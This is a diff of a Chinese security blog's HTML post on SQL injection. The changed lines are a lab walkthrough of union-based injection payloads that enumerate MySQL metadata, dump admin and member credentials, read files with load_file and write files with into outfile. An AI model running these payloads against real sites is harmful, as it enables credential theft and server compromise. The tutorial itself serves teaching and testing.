@@ -15,7 +15,7 @@
 <meta property="og:description" content="Access无数据库用户 mysql里面有内置的管理用户，其中root就是默认数据库管理员用户 网站上面的数据库都在mysql中，由root或一对一用户去管理 接受的参数值未进行过滤直接带入SQL查询的操作 就是SQL注入产生的原理 攻击：利用SQL语句执行你想要的东西（SQL语句能干嘛，注入就能干嘛） SQL语句能干嘛 &#x3D; SQL语句由谁决定 &#x3D;&gt; 数据库类型决定 (为">
 <meta property="og:locale">
 <meta property="article:published_time" content="2024-03-15T14:00:59.000Z">
-<meta property="article:modified_time" content="2024-03-16T20:07:16.714Z">
+<meta property="article:modified_time" content="2024-03-23T17:54:19.390Z">
 <meta property="article:author" content="Cypher Sun">
 <meta name="twitter:card" content="summary">
 
@@ -57,7 +57,7 @@
 
 <!-- Variable -->
 <script>window.ASYNC_CONFIG = {"hostname":"example.com","author":"Cypher Sun","root":"/","typed_text":["I`m a cybersecurity engineer","Welcome to my blog!"],"theme_version":"2.1.10","theme":{"switch":true,"default":"style-light"},"favicon":{"logo":null,"icon16":null,"icon32":"favicon.ico","appleTouchIcon":null,"webmanifest":null,"visibilitychange":true,"hidden":"favicon.ico","showText":"骗你的~ (￣▽￣)ノ","hideText":"崩溃啦！(╯‵□′)╯︵┻━┻"},"i18n":{"placeholder":"搜索文章...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）","author":"本文作者：","copyright_link":"本文链接：","copyright_license_title":"版权声明：","copyright_license_content":"本博客所有文章除特别声明外，均默认采用 undefined 许可协议。","copy_success":"复制成功","copy_failure":"复制失败","open_read_mode":"进入阅读模式","exit_read_mode":"退出阅读模式","notice_outdate_message":"距离上次更新已经 undefined 天了, 文章内容可能已经过时。","sticky":"置顶","just":"刚刚","min":"分钟前","hour":"小时前","day":"天前","month":"个月前"},"swup":true,"plugin":{"flickr_justified_gallery":"https://unpkg.com/flickr-justified-gallery@latest/dist/fjGallery.min.js"},"icons":{"sun":"far fa-sun","moon":"far fa-moon","play":"fas fa-play","email":"far fa-envelope","next":"fas fa-arrow-right","calendar":"far fa-calendar-alt","clock":"far fa-clock","user":"far fa-user","back_top":"fas fa-arrow-up","close":"fas fa-times","search":"fas fa-search","reward":"fas fa-hand-holding-usd","user_tag":"fas fa-user-alt","toc_tag":"fas fa-th-list","read":"fas fa-book-reader","arrows":"fas fa-arrows-alt-h","double_arrows":"fas fa-angle-double-down","copy":"fas fa-copy"},"icontype":"font","highlight":{"plugin":"highlighjs","theme":true,"copy":true,"lang":true,"title":"default","height_limit":"200px"},"toc":{"post_title":true},"live_time":{"start_time":"03/09/2024 15:46:00","prefix":"博客已萌萌哒运行 undefined 天"},"search":{"enable":true,"type":"local","href":"https://www.google.com/search?q=site:","domain":null,"path":"search.xml"}};</script>
-<script id="async-page-config">window.PAGE_CONFIG = {"isPost":true,"isHome":false,"postUpdate":"2024-03-17 04:07:16"};</script>
+<script id="async-page-config">window.PAGE_CONFIG = {"isPost":true,"isHome":false,"postUpdate":"2024-03-24 01:54:19"};</script>
 
 <!-- Theme mode css -->
 <link data-swup-theme rel="stylesheet" href="/css/index.css?v=2.1.10" id="trm-switch-style">
@@ -418,25 +418,25 @@
 <p><strong>注入操作</strong>：</p>
 <ol>
 <li><p>为什么是6？是因为表里面有6个列，实战不知道，折中法慢慢试</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.1.139:81/new.php?<span class="built_in">id</span>=1 order by 6</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1.1.1.1:81/new.php?<span class="built_in">id</span>=1 order by 6</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>页面显示了哪几个数字就是有注入点的地方，没出数字前面加-号可以让他出，显示了2,4,5之后都在这三个地方写注入代码</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.1.139:81/new.php?<span class="built_in">id</span>=-1 union <span class="keyword">select</span> 1,2,3,4,5,6</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1.1.1.1:81/new.php?<span class="built_in">id</span>=-1 union <span class="keyword">select</span> 1,2,3,4,5,6</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>插入进去看数据库demo01，用户root@localhost</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.1.139:81/new.php?<span class="built_in">id</span>=-1 union <span class="keyword">select</span> 1,2,3,database(),user(),6</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1.1.1.1:81/new.php?<span class="built_in">id</span>=-1 union <span class="keyword">select</span> 1,2,3,database(),user(),6</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>插入进去看版本5.7.26，操作系统Win64</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.1.139:81/new.php?<span class="built_in">id</span>=-1 union <span class="keyword">select</span> 1,2,3,version(),@@version_compile_os,6</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1.1.1.1:81/new.php?<span class="built_in">id</span>=-1 union <span class="keyword">select</span> 1,2,3,version(),@@version_compile_os,6</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>数据库名之前已经知道了，现在需要知道下面有什么表，所以查询demo01下的表名,表名信息借助mysql自带的<br>information_schema.tables存储查询，加上group_concat，查询所有的，显示出三个表名admin,gbook,news</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.1.139:81/new.php?<span class="built_in">id</span>=-1 union <span class="keyword">select</span> 1,2,3,group_concat(table_name),5,6 from information_schema.tables <span class="built_in">where</span> table_schema=<span class="string">&#x27;demo01&#x27;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1.1.1.1:81/new.php?<span class="built_in">id</span>=-1 union <span class="keyword">select</span> 1,2,3,group_concat(table_name),5,6 from information_schema.tables <span class="built_in">where</span> table_schema=<span class="string">&#x27;demo01&#x27;</span></span><br></pre></td></tr></table></figure>
 </li>
 <li><p>表名已经知道了，现在需要知道下面有什么列，所以查询admin下的表名）表名信息借助mysql自带的information_schema.columns存储查询，加上group_concat，查询所有的，显示出三个列名username,password,id</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.1.139:81/new.php?<span class="built_in">id</span>=-1 union <span class="keyword">select</span> 1,2,3,4,group_concat(column_name),6 from information_schema.columns <span class="built_in">where</span> table_schema=<span class="string">&#x27;demo01&#x27;</span> and table_name=<span class="string">&#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1.1.1.1:81/new.php?<span class="built_in">id</span>=-1 union <span class="keyword">select</span> 1,2,3,4,group_concat(column_name),6 from information_schema.columns <span class="built_in">where</span> table_schema=<span class="string">&#x27;demo01&#x27;</span> and table_name=<span class="string">&#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure>
 </li>
 <li><p>知道admin的列名信息，就到最后一步了，使用id&#x3D;1继续往下能获得更多账号密码</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.1.139:81/new.php?<span class="built_in">id</span>=-1 union <span class="keyword">select</span> 1,<span class="built_in">id</span>,3,username,password,6 from admin <span class="built_in">where</span> <span class="built_in">id</span>=1</span><br></pre></td></tr></table></figure></li>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1.1.1.1:81/new.php?<span class="built_in">id</span>=-1 union <span class="keyword">select</span> 1,<span class="built_in">id</span>,3,username,password,6 from admin <span class="built_in">where</span> <span class="built_in">id</span>=1</span><br></pre></td></tr></table></figure></li>
 </ol>
 <br>
 
@@ -448,15 +448,15 @@
 <p>测试不同数据库用户：root demo<br><strong>跨库查询操作</strong>：</p>
 <ol>
 <li><p>查询所有的数据库名，得到所有的数据库表名之后</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.1.139:81/new.php?<span class="built_in">id</span>=-1 union <span class="keyword">select</span> 1,2,3,4,group_concat(schema_name),6 from information_schema.schemata</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1.1.1.1:81/new.php?<span class="built_in">id</span>=-1 union <span class="keyword">select</span> 1,2,3,4,group_concat(schema_name),6 from information_schema.schemata</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>查询数据库名zblog下面的表名</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.1.139:81/new.php?<span class="built_in">id</span>=-1 union <span class="keyword">select</span> 1,2,3,4,group_concat(table_name),6 from information_schema.tables <span class="built_in">where</span> table_schema=<span class="string">&#x27;zblog&#x27;</span></span><br></pre></td></tr></table></figure></li>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1.1.1.1:81/new.php?<span class="built_in">id</span>=-1 union <span class="keyword">select</span> 1,2,3,4,group_concat(table_name),6 from information_schema.tables <span class="built_in">where</span> table_schema=<span class="string">&#x27;zblog&#x27;</span></span><br></pre></td></tr></table></figure></li>
 <li><p>查询数据库名zblog下面的zbp_member列名</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.1.139:81/new.php?<span class="built_in">id</span>=-1 union <span class="keyword">select</span> 1,2,3,4,group_concat(column_name),6 from information_schema.columns <span class="built_in">where</span> table_name=<span class="string">&#x27;zbp_member&#x27;</span> and table_schema=<span class="string">&#x27;zblog&#x27;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1.1.1.1:81/new.php?<span class="built_in">id</span>=-1 union <span class="keyword">select</span> 1,2,3,4,group_concat(column_name),6 from information_schema.columns <span class="built_in">where</span> table_name=<span class="string">&#x27;zbp_member&#x27;</span> and table_schema=<span class="string">&#x27;zblog&#x27;</span></span><br></pre></td></tr></table></figure>
 </li>
 <li><p>跨库查询需要加. 查询数据库名zblog下面的zbp_member列名下面的mem_Name和mem_Password</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.1.139:81/new.php?<span class="built_in">id</span>=-1 union <span class="keyword">select</span> 1,2,3,mem_Name,mem_Password,6 from zblog.zbp_member</span><br></pre></td></tr></table></figure></li>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1.1.1.1:81/new.php?<span class="built_in">id</span>=-1 union <span class="keyword">select</span> 1,2,3,mem_Name,mem_Password,6 from zblog.zbp_member</span><br></pre></td></tr></table></figure></li>
 </ol>
 <p>权限高可以跨库查看其他的库，权限低就只能查看自己的，使用user()来查看是否是root用户。而决定权取决于连接的服务器。<br><br></p>
 <h2 id="PHP-MYSQL-SQL文件读写"><a href="#PHP-MYSQL-SQL文件读写" class="headerlink" title="PHP-MYSQL-SQL文件读写"></a>PHP-MYSQL-SQL文件读写</h2><p><strong>影响条件</strong>：</p>
@@ -470,10 +470,10 @@
 <p>测试不同数据库用户：root demo</p>
 <ol>
 <li><p>尝试读取</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.1.139:81/new.php?<span class="built_in">id</span>=-1 union <span class="keyword">select</span> 1,load_file(<span class="string">&#x27;d:\\1.txt&#x27;</span>),3,4,5,6</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1.1.1.1:81/new.php?<span class="built_in">id</span>=-1 union <span class="keyword">select</span> 1,load_file(<span class="string">&#x27;d:\\1.txt&#x27;</span>),3,4,5,6</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>可以找到配置文件，写入后门到web里</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.1.139:81/new.php?<span class="built_in">id</span>=-1 union <span class="keyword">select</span> 1,<span class="string">&#x27;cypher&#x27;</span>,3,4,5,6 into outfile <span class="string">&#x27;d:\\2.txt&#x27;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1.1.1.1:81/new.php?<span class="built_in">id</span>=-1 union <span class="keyword">select</span> 1,<span class="string">&#x27;cypher&#x27;</span>,3,4,5,6 into outfile <span class="string">&#x27;d:\\2.txt&#x27;</span></span><br></pre></td></tr></table></figure>
 <br></li>
 </ol>
 <p><strong>读写的路径的问题</strong>：</p>
